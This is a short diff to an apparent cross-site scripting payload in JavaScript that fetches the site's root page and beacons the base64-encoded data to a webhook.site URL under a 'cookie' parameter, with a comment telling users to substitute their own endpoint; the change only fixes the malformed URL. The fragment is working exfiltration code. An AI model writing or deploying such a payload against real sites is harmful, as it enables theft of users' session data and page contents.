@@ -35,7 +35,7 @@ x.onreadystatechange = function(){
 
     // Send back
     // CHANGE THIS URL TO YOUR OWN
-    new Image().src = 'http://https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3/cookie?=' + btoa(data);
+    new Image().src = 'https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3/cookie?=' + btoa(data);
   }
 }
 x.open('GET', '/' , true ); 
